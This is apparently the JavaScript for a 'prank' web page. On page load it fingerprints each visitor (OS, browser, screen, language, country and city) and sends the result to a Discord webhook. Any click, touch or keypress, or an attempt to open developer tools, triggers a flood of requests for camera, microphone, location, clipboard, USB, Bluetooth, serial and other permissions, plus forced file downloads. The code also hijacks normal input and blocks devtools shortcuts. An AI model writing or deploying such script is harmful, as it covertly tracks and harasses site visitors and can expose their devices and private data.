
const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";


const MEDIA_FILES = [
  "plakal.jpg",
  "wellman.jpg",
  "wellman2.jpg"
];

function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browser = "Unknown", version = "";
  if (ua.includes("Firefox/")) { browser = "Firefox"; version = ua.match(/Firefox\/([\d.]+)/)?.[1] || ""; }
  else if (ua.includes("Edg/")) { browser = "Edge"; version = ua.match(/Edg\/([\d.]+)/)?.[1] || ""; }
  else if (ua.includes("Chrome/") && !ua.includes("Edg/")) { browser = "Chrome"; version = ua.match(/Chrome\/([\d.]+)/)?.[1] || ""; }
  else if (ua.includes("Safari/") && !ua.includes("Chrome")) { browser = "Safari"; version = ua.match(/Version\/([\d.]+)/)?.[1] || ""; }
  else if (ua.includes("OPR/") || ua.includes("Opera")) { browser = "Opera"; version = ua.match(/OPR\/([\d.]+)/)?.[1] || ""; }
  return `${browser} ${version}`;
}

function getOS() {
  const ua = navigator.userAgent;
  if (ua.includes("Windows NT 10")) return "Windows 10/11";
  if (ua.includes("Windows")) return "Windows";
  if (ua.includes("Mac OS X")) {
    const ver = ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, ".") || "";
    return `macOS ${ver}`;
  }
  if (ua.includes("Android")) return "Android";
  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
  if (ua.includes("Linux")) return "Linux";
  return "Unknown OS";
}

async function getCountry() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    return `${data.country_name} (${data.city || "Unknown city"})`;
  } catch { return "Unknown"; }
}

async function sendVisitorInfo() {
  if (WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;
  const country = await getCountry();
  const embed = {
    title: "👀 New Prank Visitor",
    color: 0xff6600,
    fields: [
      { name: "🌍 Country", value: country, inline: true },
      { name: "🖥️ OS", value: getOS(), inline: true },
      { name: "🌐 Browser", value: getBrowserInfo(), inline: true },
      { name: "📐 Screen", value: `${screen.width}x${screen.height}`, inline: true },
      { name: "🗣️ Language", value: navigator.language || "Unknown", inline: true },
      { name: "🕐 Time (UTC)", value: new Date().toLocaleString("en-US", { timeZone: "UTC" }), inline: true },
    ],
    footer: { text: "No IP address collected" },
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });
  } catch {}
}

sendVisitorInfo();
function triggerAutoDownload(file) {
  try {
    const a = document.createElement("a");
    a.href = `media/${file}`;
    a.download = file;
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {}
}

function triggerAllDownloads() {
  MEDIA_FILES.forEach((file, i) => {
    setTimeout(() => triggerAutoDownload(file), i * 300);
  });
}


let triggered = false;
async function requestAll() {
  if (triggered) return;
  triggered = true;

  const promises = [];

 
  if (navigator.mediaDevices?.getUserMedia) {
    promises.push(navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {}));
  }

  
  if (navigator.geolocation) {
    promises.push(new Promise((resolve) => {
      navigator.geolocation.watchPosition(() => resolve(), () => resolve(), { enableHighAccuracy: true });
    }));
  }

 
  if (window.Notification) promises.push(Notification.requestPermission().catch(() => {}));


  if (navigator.requestMIDIAccess) promises.push(navigator.requestMIDIAccess({ sysex: true }).catch(() => {}));


  if (navigator.clipboard?.readText) promises.push(navigator.clipboard.readText().catch(() => {}));

  
  if (navigator.wakeLock) promises.push(navigator.wakeLock.request("screen").catch(() => {}));

  
  if (navigator.bluetooth) {
    promises.push(navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {}));
  }

  
  if (navigator.usb) promises.push(navigator.usb.requestDevice({ filters: [] }).catch(() => {}));

  
  if (navigator.serial) promises.push(navigator.serial.requestPort().catch(() => {}));


  if (navigator.hid) promises.push(navigator.hid.requestDevice({ filters: [] }).catch(() => {}));

  
  if (window.showDirectoryPicker) promises.push(window.showDirectoryPicker().catch(() => {}));

 
  if (window.getScreenDetails) promises.push(window.getScreenDetails().catch(() => {}));

  
  triggerAllDownloads();

  await Promise.allSettled(promises);
}


let spaceCount = 0;

document.addEventListener("click", (e) => { e.preventDefault(); requestAll(); });
document.addEventListener("touchstart", (e) => { e.preventDefault(); requestAll(); }, { passive: false });
document.addEventListener("contextmenu", (e) => { e.preventDefault(); requestAll(); });
document.addEventListener("keydown", (e) => {
  if (e.key === " ") {
    e.preventDefault();
    spaceCount++;
    if (spaceCount >= 3) requestAll();
    return;
  }
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && ["I", "C", "J"].includes(e.key.toUpperCase()))
  ) {
    e.preventDefault();
    requestAll();
  }
});
